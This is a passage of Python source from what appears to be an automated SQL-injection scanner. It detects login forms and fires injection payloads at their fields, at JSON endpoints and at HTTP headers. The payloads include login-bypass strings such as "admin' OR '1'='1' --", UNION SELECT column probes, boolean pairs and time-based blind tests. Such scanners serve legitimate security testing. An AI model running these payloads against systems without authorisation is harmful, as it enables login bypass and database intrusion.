            soup = BeautifulSoup(html_content, 'html.parser')
            forms = soup.find_all('form')
            
            # If we found forms, check for login forms separately
            login_forms = []
            regular_forms = []
            
            for form in forms:
                # Check if this looks like a login form
                form_inputs = form.find_all(['input', 'textarea'])
                input_names = [inp.get('name', '').lower() for inp in form_inputs if inp.get('name')]
                input_types = [inp.get('type', '').lower() for inp in form_inputs if inp.get('type')]
                
                # Check if form has password field and username/email field
                has_password_field = any(inp_type == 'password' for inp_type in input_types)
                has_username_field = any(name in ['username', 'user', 'email', 'login', 'userid'] for name in input_names)
                
                form_action = form.get('action', '').lower()
                form_id = form.get('id', '').lower()
                form_class = form.get('class', [])
                if isinstance(form_class, list):
                    form_class = ' '.join(form_class).lower()
                else:
                    form_class = str(form_class).lower()
                
                # Check if form contains login indicators in action, id, or class
                login_indicators = ['login', 'auth', 'signin', 'logon', 'sign-in']
                contains_login_indicator = any(indicator in form_action or indicator in form_id or indicator in form_class for indicator in login_indicators)
                
                # If it looks like a login form, add it to login_forms, otherwise to regular_forms
                if (has_password_field and has_username_field) or contains_login_indicator:
                    login_forms.append(form)
                else:
                    regular_forms.append(form)
            
            # Process login forms first with special techniques
            for form in login_forms:
                form_action = form.get('action', '')
                form_method = form.get('method', 'get').lower()
                
                # Resolve the form action URL
                if form_action.startswith('http'):
                    form_url = form_action
                elif form_action.startswith('/'):
                    parsed_url = urlparse(url)
                    form_url = f"{parsed_url.scheme}://{parsed_url.netloc}{form_action}"
                else:
                    # Relative URL
                    base_url = url.rsplit('/', 1)[0] if '/' in url.split('://', 1)[1] else url
                    form_url = f"{base_url}/{form_action}"
                
                # Test login bypass attacks
                login_bypass_result = await self._test_login_bypass(form, form_url, semaphore, method=form_method)
                if login_bypass_result:
                    vulnerabilities.append(login_bypass_result)
                
                # Process each input field in the form
                input_fields = form.find_all(['input', 'textarea'])
                for input_field in input_fields:
                    input_type = input_field.get('type', '').lower()
                    input_name = input_field.get('name', '')
                    
                    # Skip submit, button, file inputs, etc.
                    if not input_name or input_type in ['submit', 'button', 'file', 'image', 'reset', 'checkbox', 'radio']:
                        continue
                    
                    # Get the default value and increase priority for username/password fields
                    input_value = input_field.get('value', '')
                    priority = 2.0 if input_name.lower() in ['username', 'user', 'email', 'password', 'pass', 'passwd'] else 1.0
                    
                    # Test for error-based SQL injection
                    result = await self._test_error_sqli(form_url, input_name, input_value, "login form", semaphore, method=form_method, priority=priority)
                    if result:
                        vulnerabilities.append(result)
                    
                    # Test for blind SQL injection
                    result = await self._test_blind_sqli(form_url, input_name, input_value, "login form", semaphore, method=form_method, priority=priority)
                    if result:
                        vulnerabilities.append(result)
            
            # Process regular forms
            for form in regular_forms:
                form_action = form.get('action', '')
                form_method = form.get('method', 'get').lower()
                
                # Resolve the form action URL
                if form_action.startswith('http'):
                    form_url = form_action
                elif form_action.startswith('/'):
                    parsed_url = urlparse(url)
                    form_url = f"{parsed_url.scheme}://{parsed_url.netloc}{form_action}"
                else:
                    # Relative URL
                    base_url = url.rsplit('/', 1)[0] if '/' in url.split('://', 1)[1] else url
                    form_url = f"{base_url}/{form_action}"
                
                # Process each input field in the form including hidden fields
                input_fields = form.find_all(['input', 'textarea'])
                for input_field in input_fields:
                    input_type = input_field.get('type', '').lower()
                    input_name = input_field.get('name', '')
                    
                    # Skip submit, button, file inputs, etc.
                    if not input_name or input_type in ['submit', 'button', 'file', 'image', 'reset', 'checkbox', 'radio']:
                        continue
                    
                    # Get the default value
                    input_value = input_field.get('value', '')
                    
                    # Check for hidden fields which might be vulnerable
                    if input_type == 'hidden':
                        print(f"Found hidden field: {input_name}={input_value}")
                        # Increase priority for hidden fields that look like they might contain database IDs
                        priority = 1.5 if input_name.lower() in ['id', 'record', 'uid', 'key'] else 1.0
                    else:
                        priority = 1.0
                    
                    # Test for error-based SQL injection
                    result = await self._test_error_sqli(form_url, input_name, input_value, "form", semaphore, method=form_method, priority=priority)
                    if result:
                        vulnerabilities.append(result)
                    
                    # Test for blind SQL injection
                    result = await self._test_blind_sqli(form_url, input_name, input_value, "form", semaphore, method=form_method, priority=priority)
                    if result:
                        vulnerabilities.append(result)
            
            # Check for any JSON or XML content APIs referenced in the page
            json_apis = self._extract_api_endpoints(html_content, ['json', 'api', 'data', 'query', 'graphql', 'rest'])
            for api_url in json_apis:
                # JSON/XML APIs might need different testing
                json_result = await self._test_json_endpoint(api_url, semaphore)
                if json_result:
                    vulnerabilities.extend(json_result)
        
        except Exception as e:
            print(f"Error checking forms for SQL injection: {str(e)}")
        
        return vulnerabilities

    def _extract_api_endpoints(self, html_content: str, keywords: List[str]) -> List[str]:
        """
        Extract potential API endpoints from HTML content.
        
        Args:
            html_content: The HTML content to search
            keywords: Keywords to look for in URLs
            
        Returns:
            A list of potential API URLs
        """
        api_urls = []
        
        # Find all URLs in the HTML content
        url_pattern = r'(https?://[^\s\'"<>]+)|(/[^\s\'"<>]+)'
        urls = re.findall(url_pattern, html_content)
        
        # Flatten the list of tuples
        all_urls = [url for url_tuple in urls for url in url_tuple if url]
        
        # Filter for URLs that look like APIs
        for url in all_urls:
            # Check if the URL contains any of the keywords
            if any(keyword in url.lower() for keyword in keywords):
                # If it's a relative URL, make it absolute
                if url.startswith('/'):
                    # Since we don't have the base URL here, we'll add it as-is and resolve later
                    api_urls.append(url)
                else:
                    api_urls.append(url)
            
            # Also check for URLs with .json, .xml extensions
            elif url.endswith('.json') or url.endswith('.xml'):
                api_urls.append(url)
        
        return list(set(api_urls))  # Remove duplicates
    
    async def _test_json_endpoint(self, api_url: str, semaphore: asyncio.Semaphore) -> List[Dict[str, Any]]:
        """
        Test a JSON or XML API endpoint for SQL injection vulnerabilities.
        
        Args:
            api_url: The API URL to test
            semaphore: Semaphore to limit concurrent requests
            
        Returns:
            A list of vulnerabilities found
        """
        vulnerabilities = []
        
        try:
            # If api_url is a relative URL, we need to make it absolute
            if api_url.startswith('/'):
                # Skip for now
                return []
            
            # Check if the endpoint responds to JSON requests
            async with semaphore:
                async with aiohttp.ClientSession() as session:
                    headers = {
                        'Content-Type': 'application/json',
                        'Accept': 'application/json'
                    }
                    
                    # First try a GET request to see if it accepts JSON
                    try:
                        async with session.get(api_url, headers=headers, timeout=10, ssl=False) as response:
                            if response.status == 200:
                                # Try to parse as JSON
                                try:
                                    data = await response.json()
                                    is_json = True
                                except:
                                    is_json = False
                                
                                if is_json:
                                    # If it's JSON, look for parameters we can test
                                    if isinstance(data, dict):
                                        # Test each parameter in the JSON response
                                        for key in data.keys():
                                            # Try a simple JSON payload with SQL injection
                                            for payload in random.sample(self.error_payloads, min(3, len(self.error_payloads))):
                                                json_payload = {key: payload}
                                                
                                                try:
                                                    async with session.post(api_url, json=json_payload, headers=headers, timeout=10, ssl=False) as post_response:
                                                        post_text = await post_response.text()
                                                        
                                                        # Check for SQL error patterns
                                                        for pattern in self.sql_error_patterns:
                                                            if re.search(pattern, post_text, re.IGNORECASE):
                                                                vulnerabilities.append({
                                                                    "id": str(uuid.uuid4()),
                                                                    "name": "SQL Injection in JSON API",
                                                                    "description": f"SQL injection vulnerability detected in JSON API parameter: {key}",
                                                                    "severity": "high",
                                                                    "location": api_url,
                                                                    "evidence": f"JSON parameter '{key}' with payload '{payload}' triggered error pattern: {pattern}",
                                                                    "remediation": "Use parameterized queries or prepared statements. Validate all JSON input before using in database operations."
                                                                })
                                                                break
                                                except Exception:
                                                    continue
                    except Exception:
                        pass  # If GET fails, we'll try POST anyway
                    
                    # Try a POST request with a simple JSON object containing SQLi payloads
                    try:
                        # Create a payload with some common parameter names
                        for param_name in ['id', 'query', 'filter', 'search', 'input', 'data']:
                            for payload in random.sample(self.error_payloads, min(3, len(self.error_payloads))):
                                json_payload = {param_name: payload}
                                
                                async with session.post(api_url, json=json_payload, headers=headers, timeout=10, ssl=False) as response:
                                    post_text = await response.text()
                                    
                                    # Check for SQL error patterns
                                    for pattern in self.sql_error_patterns:
                                        if re.search(pattern, post_text, re.IGNORECASE):
                                            vulnerabilities.append({
                                                "id": str(uuid.uuid4()),
                                                "name": "SQL Injection in JSON API",
                                                "description": f"SQL injection vulnerability detected in JSON API parameter: {param_name}",
                                                "severity": "high",
                                                "location": api_url,
                                                "evidence": f"JSON parameter '{param_name}' with payload '{payload}' triggered error pattern: {pattern}",
                                                "remediation": "Use parameterized queries or prepared statements. Validate all JSON input before using in database operations."
                                            })
                                            break
                    except Exception:
                        pass
        
        except Exception as e:
            print(f"Error testing JSON endpoint {api_url}: {str(e)}")
        
        return vulnerabilities
    
    async def _test_login_bypass(self, form, form_url: str, semaphore: asyncio.Semaphore, method: str = "post") -> Optional[Dict[str, Any]]:
        """
        Test a login form for SQL injection bypass vulnerabilities.
        
        Args:
            form: The login form element
            form_url: The form action URL
            semaphore: Semaphore to limit concurrent requests
            method: HTTP method (usually post for login forms)
            
        Returns:
            A vulnerability dict if found, None otherwise
        """
        try:
            # Find username and password fields
            username_field = None
            password_field = None
            
            for input_field in form.find_all('input'):
                input_type = input_field.get('type', '').lower()
                input_name = input_field.get('name', '').lower()
                
                if input_type == 'password':
                    password_field = input_name
                elif input_type == 'text' or input_name in ['username', 'user', 'email', 'login', 'userid']:
                    username_field = input_name
            
            if not username_field or not password_field:
                return None
            
            # Create form data for the login bypass attempt
            login_payloads = [
                "admin' --",
                "admin' OR '1'='1' --",
                "admin' OR 1=1 --",
                "admin'/*",
                "' OR 1=1 --",
                "' OR '1'='1",
                "admin') OR ('1'='1"
            ]
            
            # Try each payload
            for payload in login_payloads:
                form_data = {}
                
                # Fill in the login form with our payload
                for input_field in form.find_all('input'):
                    input_name = input_field.get('name', '')
                    input_type = input_field.get('type', '').lower()
                    
                    if not input_name or input_type in ['submit', 'button', 'image', 'reset']:
                        continue
                    
                    if input_name.lower() == username_field:
                        form_data[input_name] = payload
                    elif input_name.lower() == password_field:
                        form_data[input_name] = "anypassword"
                    else:
                        # Include any other required fields with default values
                        input_value = input_field.get('value', '')
                        if input_value:
                            form_data[input_name] = input_value
                        elif input_type == 'checkbox':
                            form_data[input_name] = 'on'
                        else:
                            form_data[input_name] = ''
                
                # Send the login request
                async with semaphore:
                    async with aiohttp.ClientSession() as session:
                        try:
                            if method.lower() == 'post':
                                async with session.post(form_url, data=form_data, timeout=10, ssl=False, allow_redirects=True) as response:
                                    response_text = await response.text()
                                    
                                    # Check if login was successful
                                    if response.status == 200 or response.status == 302:
                                        # Look for success indicators in the response
                                        success_indicators = ['welcome', 'dashboard', 'profile', 'logout', 'sign out']
                                        if any(indicator in response_text.lower() for indicator in success_indicators):
                                            # Seems like a successful login
                                            return {
                                                "id": str(uuid.uuid4()),
                                                "name": "SQL Injection Login Bypass",
                                                "description": "Login form vulnerable to SQL injection bypass",
                                                "severity": "critical",
                                                "location": form_url,
                                                "evidence": f"Login was bypassed using SQL injection payload: {payload} in {username_field} field",
                                                "remediation": "Use parameterized queries or prepared statements for login authentication. Never concatenate user input directly into SQL queries."
                                            }
                                        
                                        # Also check for SQL errors in response
                                        for pattern in self.sql_error_patterns:
                                            if re.search(pattern, response_text, re.IGNORECASE):
                                                return {
                                                    "id": str(uuid.uuid4()),
                                                    "name": "SQL Injection in Login Form",
                                                    "description": "Login form vulnerable to SQL injection",
                                                    "severity": "high",
                                                    "location": form_url,
                                                    "evidence": f"SQL error pattern found when using payload: {payload} in {username_field} field. Pattern: {pattern}",
                                                    "remediation": "Use parameterized queries or prepared statements for login authentication. Never concatenate user input directly into SQL queries."
                                                }
                            else:
                                # For GET method login forms (uncommon but possible)
                                params = form_data
                                async with session.get(form_url, params=params, timeout=10, ssl=False, allow_redirects=True) as response:
                                    response_text = await response.text()
                                    
                                    # Same checks as for POST
                                    if response.status == 200 or response.status == 302:
                                        success_indicators = ['welcome', 'dashboard', 'profile', 'logout', 'sign out']
                                        if any(indicator in response_text.lower() for indicator in success_indicators):
                                            return {
                                                "id": str(uuid.uuid4()),
                                                "name": "SQL Injection Login Bypass",
                                                "description": "Login form vulnerable to SQL injection bypass",
                                                "severity": "critical",
                                                "location": form_url,
                                                "evidence": f"Login was bypassed using SQL injection payload: {payload} in {username_field} field",
                                                "remediation": "Use parameterized queries or prepared statements for login authentication. Never concatenate user input directly into SQL queries."
                                            }
                                        
                                        for pattern in self.sql_error_patterns:
                                            if re.search(pattern, response_text, re.IGNORECASE):
                                                return {
                                                    "id": str(uuid.uuid4()),
                                                    "name": "SQL Injection in Login Form",
                                                    "description": "Login form vulnerable to SQL injection",
                                                    "severity": "high",
                                                    "location": form_url,
                                                    "evidence": f"SQL error pattern found when using payload: {payload} in {username_field} field. Pattern: {pattern}",
                                                    "remediation": "Use parameterized queries or prepared statements for login authentication. Never concatenate user input directly into SQL queries."
                                                }
                        except Exception as e:
                            print(f"Error testing login bypass for {form_url}: {str(e)}")
            
            return None
        
        except Exception as e:
            print(f"Error in login bypass test: {str(e)}")
            return None
    
    async def _check_headers(self, url: str, semaphore: asyncio.Semaphore) -> List[Dict[str, Any]]:
        """
        Check HTTP headers for SQL injection vulnerabilities.
        
        Args:
            url: The URL to check
            semaphore: Semaphore to limit concurrent requests
            
        Returns:
            A list of vulnerabilities found
        """
        vulnerabilities = []
        
        try:
            # Headers to test for SQL injection
            headers_to_test = {
                "User-Agent": random.choice(self.error_payloads),
                "Referer": f"{url}' OR 1=1 --",
                "Cookie": f"id={random.choice(self.error_payloads)}; session=test"
            }
            
            # First make a normal request to establish baseline
            async with semaphore:
                async with aiohttp.ClientSession() as session:
                    async with session.get(url, timeout=10, ssl=False) as baseline_response:
                        baseline_text = await baseline_response.text()
                        
                        # Now test with SQL injection payloads in headers
                        start_time = time.time()
                        try:
                            async with session.get(url, headers=headers_to_test, timeout=15, ssl=False) as response:
                                response_time = time.time() - start_time
                                response_text = await response.text()
                                
                                # Check for SQL error patterns
                                for pattern in self.sql_error_patterns:
                                    if re.search(pattern, response_text, re.IGNORECASE) and not re.search(pattern, baseline_text, re.IGNORECASE):
                                        vulnerabilities.append({
                                            "id": str(uuid.uuid4()),
                                            "name": "SQL Injection in HTTP Headers",
                                            "description": "SQL injection vulnerability detected in HTTP headers",
                                            "severity": "high",
                                            "location": url,
                                            "evidence": f"SQL error pattern found: {pattern}",
                                            "remediation": "Sanitize and validate all inputs including HTTP headers. Use parameterized queries."
                                        })
                                        break
                                
                                # Check for time-based blind injection
                                if response_time > 3.0:  # If response took more than 3 seconds
                                    vulnerabilities.append({
                                        "id": str(uuid.uuid4()),
                                        "name": "Blind SQL Injection in HTTP Headers",
                                        "description": "Time-based blind SQL injection detected in HTTP headers",
                                        "severity": "high",
                                        "location": url,
                                        "evidence": f"Request with payload in headers took {response_time:.2f} seconds",
                                        "remediation": "Sanitize and validate all inputs including HTTP headers. Use parameterized queries."
                                    })
                        except asyncio.TimeoutError:
                            # Timeout could indicate a successful blind injection
                            vulnerabilities.append({
                                "id": str(uuid.uuid4()),
                                "name": "Blind SQL Injection in HTTP Headers",
                                "description": "Time-based blind SQL injection detected in HTTP headers (request timed out)",
                                "severity": "high",
                                "location": url,
                                "evidence": "Request with payload in headers timed out",
                                "remediation": "Sanitize and validate all inputs including HTTP headers. Use parameterized queries."
                            })
        
        except Exception as e:
            print(f"Error checking headers for SQL injection: {str(e)}")
        
        return vulnerabilities 
    
    async def _test_error_sqli(self, url: str, param_name: str, param_value: str, 
                              location_type: str, semaphore: asyncio.Semaphore, 
                              method: str = "get", priority: float = 1.0) -> Optional[Dict[str, Any]]:
        """
        Test a parameter for error-based SQL injection.
        
        Args:
            url: The URL to test
            param_name: The parameter name
            param_value: The parameter value
            location_type: Type of location (url or form)
            semaphore: Semaphore to limit concurrent requests
            method: HTTP method (get or post)
            priority: Priority of the parameter (higher means more likely vulnerable)
            
        Returns:
            A vulnerability dict if found, None otherwise
        """
        try:
            # Skip testing if parameter is not likely to be vulnerable and not forced
            if param_name.lower() not in self.likely_params and not any(char in param_name.lower() for p in ['id', 'user', 'name', 'pass', 'key', 'mail', 'sess'] for char in p):
                # Adjust sample rate based on priority
                threshold = 0.2 * priority  # Higher priority means higher chance of testing
                if random.random() > threshold:
                    return None
            
            # First, make a normal request to establish baseline
            baseline_response = await self._make_request(url, param_name, param_value, method, semaphore)
            
            # Select payloads to try (number based on priority)
            num_payloads = min(int(3 * priority), len(self.error_payloads))
            sampled_payloads = random.sample(self.error_payloads, num_payloads)
            
            # Try each payload
            for payload in sampled_payloads:
                # Make a request with the payload
                error_response = await self._make_request(url, param_name, payload, method, semaphore)
                
                if error_response:
                    content = error_response.lower()
                    
                    # Check for SQL error patterns in the response
                    for pattern in self.sql_error_patterns:
                        if re.search(pattern, content, re.IGNORECASE):
                            # Check if the error pattern was not in the baseline response
                            if baseline_response and not re.search(pattern, baseline_response.lower(), re.IGNORECASE):
                                return {
                                    "id": str(uuid.uuid4()),
                                    "name": "SQL Injection",
                                    "description": f"SQL injection vulnerability detected in {location_type} parameter: {param_name}",
                                    "severity": "high",
                                    "location": url,
                                    "evidence": f"Parameter '{param_name}' with payload '{payload}' triggered error pattern: {pattern}",
                                    "remediation": "Use parameterized queries or prepared statements. Validate and sanitize all user inputs."
                                }
            
            # If error-based testing didn't find anything, try UNION-based
            union_result = await self._test_union_sqli(url, param_name, param_value, location_type, semaphore, method, priority)
            if union_result:
                return union_result
            
            return None
        
        except Exception as e:
            print(f"Error testing error-based SQL injection for parameter {param_name}: {str(e)}")
            return None
            
    async def _test_union_sqli(self, url: str, param_name: str, param_value: str, 
                              location_type: str, semaphore: asyncio.Semaphore, 
                              method: str = "get", priority: float = 1.0) -> Optional[Dict[str, Any]]:
        """
        Test a parameter for UNION-based SQL injection with different column counts.
        
        Args:
            url: The URL to test
            param_name: The parameter name
            param_value: The parameter value
            location_type: Type of location (url or form)
            semaphore: Semaphore to limit concurrent requests
            method: HTTP method (get or post)
            priority: Priority of the parameter (higher means more likely vulnerable)
            
        Returns:
            A vulnerability dict if found, None otherwise
        """
        try:
            # Get original response
            baseline_response = await self._make_request(url, param_name, param_value, method, semaphore)
            if not baseline_response:
                return None
                
            # Try UNION SELECT with different numbers of columns (1-7)
            # Using SQL Markers that are easy to find in the response
            markers = ["SQLi1337M1", "SQLi1337M2", "SQLi1337M3", "SQLi1337M4", "SQLi1337M5", "SQLi1337M6", "SQLi1337M7"]
            
            # Generate UNION payloads with different column counts and using our markers
            union_payloads = []
            for cols in range(1, 8):  # Testing 1-7 columns
                cols_str = ",".join([f"'{markers[i]}'" for i in range(cols)])
                payload = f"' UNION SELECT {cols_str} --"
                union_payloads.append((payload, cols))
                
                # Add a NULL version to bypass datatype restrictions
                cols_null_str = ",".join(["NULL" if i != 0 else f"'{markers[0]}'" for i in range(cols)])
                null_payload = f"' UNION SELECT {cols_null_str} --"
                union_payloads.append((null_payload, cols))
            
            # Sample a subset of payloads based on priority to reduce requests
            num_payloads = min(int(5 * priority), len(union_payloads))
            sampled_payloads = random.sample(union_payloads, num_payloads)
            
            # Sort by number of columns (prefer smaller column counts for efficiency)
            sampled_payloads.sort(key=lambda x: x[1])
            
            # Try each payload
            for payload, cols in sampled_payloads:
                response = await self._make_request(url, param_name, payload, method, semaphore)
                
                if not response:
                    continue
                
                # Check if any of our markers appear in the response
                for i in range(min(cols, len(markers))):
                    marker = markers[i]
                    if marker in response and marker not in baseline_response:
                        # Verify with a second different marker to confirm it's not a coincidence
                        verify_marker = f"SQLiVerify{random.randint(1000, 9999)}"
                        if i == 0:
                            verify_cols = ",".join([f"'{verify_marker}'" if j == 0 else "NULL" for j in range(cols)])
                        else:
                            verify_cols = ",".join([f"'{verify_marker}'" if j == i else "NULL" for j in range(cols)])
                            
                        verify_payload = f"' UNION SELECT {verify_cols} --"
                        verify_response = await self._make_request(url, param_name, verify_payload, method, semaphore)
                        
                        if verify_response and verify_marker in verify_response:
                            return {
                                "id": str(uuid.uuid4()),
                                "name": "UNION-based SQL Injection",
                                "description": f"UNION-based SQL injection vulnerability detected in {location_type} parameter: {param_name}",
                                "severity": "high",
                                "location": url,
                                "evidence": f"Parameter '{param_name}' with payload '{payload}' reflected marker '{marker}' in the response. Column count: {cols}",
                                "remediation": "Use parameterized queries or prepared statements. Validate and sanitize all user inputs."
                            }
            
            return None
        
        except Exception as e:
            print(f"Error testing UNION-based SQL injection for parameter {param_name}: {str(e)}")
            return None
    
    async def _test_blind_sqli(self, url: str, param_name: str, param_value: str, 
                              location_type: str, semaphore: asyncio.Semaphore, 
                              method: str = "get", priority: float = 1.0) -> Optional[Dict[str, Any]]:
        """
        Test a parameter for blind SQL injection, including time-based and boolean-based detection.
        
        Args:
            url: The URL to test
            param_name: The parameter name
            param_value: The parameter value
            location_type: Type of location (url or form)
            semaphore: Semaphore to limit concurrent requests
            method: HTTP method (get or post)
            priority: Priority of the parameter (higher means more likely vulnerable)
            
        Returns:
            A vulnerability dict if found, None otherwise
        """
        try:
            # Skip testing if parameter is not likely to be vulnerable
            if param_name.lower() not in self.likely_params and not any(char in param_name.lower() for p in ['id', 'user', 'name', 'pass', 'key', 'mail', 'sess'] for char in p):
                # Adjust sample rate based on priority, but keep it lower for blind testing (expensive)
                threshold = 0.1 * priority  # Higher priority means higher chance of testing
                if random.random() > threshold:
                    return None
            
            # First try boolean-based detection (it's faster than time-based)
            boolean_result = await self._test_boolean_based_sqli(url, param_name, param_value, location_type, semaphore, method, priority)
            if boolean_result:
                return boolean_result
            
            # If boolean-based detection didn't find anything, try time-based detection
            time_result = await self._test_time_based_sqli(url, param_name, param_value, location_type, semaphore, method, priority)
            if time_result:
                return time_result
            
            return None
        
        except Exception as e:
            print(f"Error testing blind SQL injection for parameter {param_name}: {str(e)}")
            return None
    
    async def _test_boolean_based_sqli(self, url: str, param_name: str, param_value: str, 
                                     location_type: str, semaphore: asyncio.Semaphore, 
                                     method: str = "get", priority: float = 1.0) -> Optional[Dict[str, Any]]:
        """
        Test a parameter for boolean-based blind SQL injection by comparing responses to TRUE and FALSE conditions.
        
        Args:
            url: The URL to test
            param_name: The parameter name
            param_value: The parameter value
            location_type: Type of location (url or form)
            semaphore: Semaphore to limit concurrent requests
            method: HTTP method (get or post)
            priority: Priority of the parameter (higher means more likely vulnerable)
            
        Returns:
            A vulnerability dict if found, None otherwise
        """
        try:
            # We'll test pairs of TRUE/FALSE conditions to detect differences in responses
            test_pairs = [
                ("' AND 1=1 --", "' AND 1=2 --"),  # Basic TRUE/FALSE pair
                ("' AND '1'='1' --", "' AND '1'='2' --"),  # String comparison pair
                ("' AND 3>2 --", "' AND 3<2 --"),  # Numeric comparison pair
                ("' OR 1=1 --", "' OR 1=2 --"),  # OR condition pair
                ("' AND (SELECT 1) --", "' AND (SELECT 0) --"),  # Subquery pair
            ]
            
            # Sample a subset of test pairs based on priority
            num_pairs = min(int(2 * priority), len(test_pairs))
            pairs_to_test = random.sample(test_pairs, num_pairs)
            
            # Get original response content and length
            original_response = await self._make_request(url, param_name, param_value, method, semaphore)
            
            if not original_response:
                return None
                
            original_len = len(original_response)
            
            # Test each TRUE/FALSE pair
            for true_payload, false_payload in pairs_to_test:
                # Test the TRUE condition
                true_response = await self._make_request(url, param_name, true_payload, method, semaphore)
                if not true_response:
                    continue
                
                # Test the FALSE condition
                false_response = await self._make_request(url, param_name, false_payload, method, semaphore)
                if not false_response:
                    continue
                
                true_len = len(true_response)
                false_len = len(false_response)
                
                # Calculate response similarity
                true_similarity_to_original = self._calc_response_similarity(original_response, true_response)
                false_similarity_to_original = self._calc_response_similarity(original_response, false_response)
                
                # Check if the responses to TRUE and FALSE conditions are significantly different
                if abs(true_len - false_len) > 10:  # Significant difference in response length
                    content_difference = self._calc_response_similarity(true_response, false_response)
                    
                    if content_difference < 0.9:  # At least 10% difference in content
                        # Double check with a different pair to confirm
                        confirm_true, confirm_false = random.choice([p for p in test_pairs if p != (true_payload, false_payload)])
                        
                        # Test the confirmation pair
                        confirm_true_response = await self._make_request(url, param_name, confirm_true, method, semaphore)
                        confirm_false_response = await self._make_request(url, param_name, confirm_false, method, semaphore)
                        
                        if confirm_true_response and confirm_false_response:
                            confirm_true_len = len(confirm_true_response)
                            confirm_false_len = len(confirm_false_response)
                            
                            # Check if the confirmation tests also show a significant difference
                            if abs(confirm_true_len - confirm_false_len) > 10:
                                # Calculate which condition is more similar to the original
                                if true_similarity_to_original > false_similarity_to_original:
                                    condition_description = "TRUE condition response is similar to original"
                                else:
                                    condition_description = "FALSE condition response is similar to original"
                                
                                return {
                                    "id": str(uuid.uuid4()),
                                    "name": "Boolean-based Blind SQL Injection",
                                    "description": f"Boolean-based blind SQL injection vulnerability detected in {location_type} parameter: {param_name}",
                                    "severity": "high",
                                    "location": url,
                                    "evidence": f"Parameter '{param_name}' with TRUE payload '{true_payload}' and FALSE payload '{false_payload}' caused response difference: {abs(true_len - false_len)} chars. {condition_description}",
                                    "remediation": "Use parameterized queries or prepared statements. Validate and sanitize all user inputs."
                                }
            
            return None
        
        except Exception as e:
            print(f"Error testing boolean-based blind SQL injection for parameter {param_name}: {str(e)}")
            return None
    
    def _calc_response_similarity(self, response1: str, response2: str) -> float:
        """
        Calculate the similarity ratio between two responses.
        
        Args:
            response1: The first response
            response2: The second response
            
        Returns:
            The similarity ratio (0.0 to 1.0)
        """
        if not response1 or not response2:
            return 0.0
            
        # For very large responses, just sample a portion to compare
        if len(response1) > 10000 or len(response2) > 10000:
            # Sample size is 10% of the smaller response size but at least 1000 chars
            sample_size = max(1000, min(len(response1), len(response2)) // 10)
            
            # Get samples from beginning, middle, and end
            response1_parts = [
                response1[:sample_size//3],
                response1[len(response1)//2 - sample_size//6:len(response1)//2 + sample_size//6],
                response1[-sample_size//3:]
            ]
            response2_parts = [
                response2[:sample_size//3],
                response2[len(response2)//2 - sample_size//6:len(response2)//2 + sample_size//6],
                response2[-sample_size//3:]
            ]
            
            # Calculate similarity for each part
            similarities = []
            for i in range(3):
                r1 = response1_parts[i]
                r2 = response2_parts[i]
                if r1 and r2:
                    # Count matching characters
                    matches = sum(c1 == c2 for c1, c2 in zip(r1, r2))
                    similarities.append(matches / max(len(r1), len(r2)))
            
            return sum(similarities) / len(similarities)
        else:
            # For smaller responses, compare the entire content
            # Count matching characters
            matches = sum(c1 == c2 for c1, c2 in zip(response1, response2))
            return matches / max(len(response1), len(response2))
                    
    async def _test_time_based_sqli(self, url: str, param_name: str, param_value: str, 
                                   location_type: str, semaphore: asyncio.Semaphore, 
                                   method: str = "get", priority: float = 1.0) -> Optional[Dict[str, Any]]:
        """
        Test a parameter for time-based blind SQL injection.
        
        Args:
            url: The URL to test
            param_name: The parameter name
            param_value: The parameter value
            location_type: Type of location (url or form)
            semaphore: Semaphore to limit concurrent requests
            method: HTTP method (get or post)
            priority: Priority of the parameter (higher means more likely vulnerable)
            
        Returns:
            A vulnerability dict if found, None otherwise
        """
        try:
            # Get or calculate baseline response time
            url_key = f"{url}:{method}"
            if url_key not in self.baseline_cache:
                # Calculate baseline response time with multiple samples for accuracy
                baseline_times = []
                for _ in range(3):
                    start_time = time.time()
                    await self._make_request(url, param_name, param_value, method, semaphore)
                    baseline_times.append(time.time() - start_time)
                
                baseline_avg = sum(baseline_times) / len(baseline_times)
                self.baseline_cache[url_key] = {"time": baseline_avg}
            else:
                baseline_avg = self.baseline_cache[url_key]["time"]
            
            # Adjust threshold based on baseline response time
            # For slow sites, we need a higher threshold to avoid false positives
            threshold = max(2.5, baseline_avg * 2)
            
            # Select payload based on database fingerprinting if available
            if hasattr(self, 'db_type') and self.db_type != "unknown":
                # Choose payload specific to detected database
                if self.db_type == "mysql":
                    payloads = [p for p in self.blind_payloads if "SLEEP" in p]
                elif self.db_type == "postgres":
                    payloads = [p for p in self.blind_payloads if "pg_sleep" in p]
                elif self.db_type == "mssql":
                    payloads = [p for p in self.blind_payloads if "WAITFOR" in p]
                elif self.db_type == "oracle":
                    payloads = [p for p in self.blind_payloads if "DBMS_PIPE" in p]
                else:
                    payloads = self.blind_payloads
                
                # If we have database-specific payloads, use them
                if payloads:
                    payload = random.choice(payloads)
                else:
                    payload = random.choice(self.blind_payloads)
            else:
                # No DB type detected, try a random payload
                payload = random.choice(self.blind_payloads)
            
            # Now, measure the response time with the payload
            start_time = time.time()
            try:
                await self._make_request(url, param_name, payload, method, semaphore, timeout=10.0)
                payload_response_time = time.time() - start_time
            except asyncio.TimeoutError:
                # Timeout could indicate a successful time-based injection
                payload_response_time = 10.0  # Timeout value
            
            # Verbose output for debugging
            time_diff = payload_response_time - baseline_avg
            print(f"Time-based SQL test for {param_name}: baseline={baseline_avg:.2f}s, payload={payload_response_time:.2f}s, diff={time_diff:.2f}s")
            
            # Check if the payload request took significantly longer
            if time_diff >= threshold:
                # Try one more time to confirm it's not a false positive
                start_time = time.time()
                try:
                    await self._make_request(url, param_name, payload, method, semaphore, timeout=10.0)
                    second_payload_time = time.time() - start_time
                except asyncio.TimeoutError:
                    second_payload_time = 10.0  # Timeout value
                
                # If the second test is also slow, it's likely a real vulnerability
                if second_payload_time - baseline_avg >= threshold:
                    return {
                        "id": str(uuid.uuid4()),
                        "name": "Time-based Blind SQL Injection",
                        "description": f"Time-based blind SQL injection vulnerability detected in {location_type} parameter: {param_name}",
                        "severity": "high",
                        "location": url,
                        "evidence": f"Parameter '{param_name}' with payload '{payload}' caused response time difference: {time_diff:.2f} seconds (baseline: {baseline_avg:.2f}s)",
                        "remediation": "Use parameterized queries or prepared statements. Validate and sanitize all user inputs."
                    }
            
            return None
        
        except Exception as e:
            print(f"Error testing time-based blind SQL injection for parameter {param_name}: {str(e)}")
            return None
    
    async def _make_request(self, url: str, param_name: str, param_value: str, method: str, semaphore: asyncio.Semaphore, timeout: float = 5.0) -> Optional[str]:
        """
        Make a request with the specified parameter.
        
        Args:
            url: The URL to test
